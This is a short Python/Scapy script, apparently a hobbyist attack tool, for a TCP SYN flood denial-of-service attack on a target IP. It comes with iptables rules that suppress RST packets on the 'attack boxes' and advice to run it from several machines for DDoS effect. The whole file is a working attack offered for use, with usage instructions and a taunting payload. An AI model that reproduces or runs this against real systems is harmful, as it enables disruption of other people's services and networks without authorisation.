#! /usr/bin/python
# This is designed to send malformed SYN packets to the target from the attacker 
# Be sure to set your iptables rules on the attack machine before running the script
# The iptabales rules will DROP packets from the OUTPUT chain that havee a RST flag.
# This will only happe nin the kernel stack layer so it won't apply to packets generated by Scapy because it 
# creates the entire packet in it's space. The malformed packets will be seen by the kernel, w hich will
# send RST responses to the target since the attacker's kernel didn't initial the TCP connection.
# To prevent this, the iptables rules below are used on the attacker machine(s) so the kernel's RST will not
# get to the target. This is what causes the target's SYN buffer to get full and cause the DDoS
# It's best to run this from 2 or more attack boxes and use the iptables template below for effect.

# "How do I use this?" you ask, simple...
# python Scapy_SYN_Flood.py <IP of target>
# Once you run that it should work unless I screwed something up.

# ADD THESE IPTABLES RULES TO YOUR ATTACK BOX! #

# iptables -A OUTPUT -p tcp -s <attackerIP> --tcp-flags RST RST -j DROP
# iptables -A OUTPUT -p tcp -s <antoher attackerIP if necessary> --tcp-flags RST RST -j DROP

import sys
from scapy.all import *
#conf.verb=0
print "Field Values of packet sent"
p=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"Pwnd by Me!"
ls(p)
print "Sending Packets in 0.3 second intevals for timeout of 4 sec"
ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
print "Summary of traffic answered & unanswered"
ans.summary()
unans.summary()
print "source port flags in response"
#for s,r in ans:
# print r.sprintf("%TCP.sport% \t %TCP.flags%")
ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
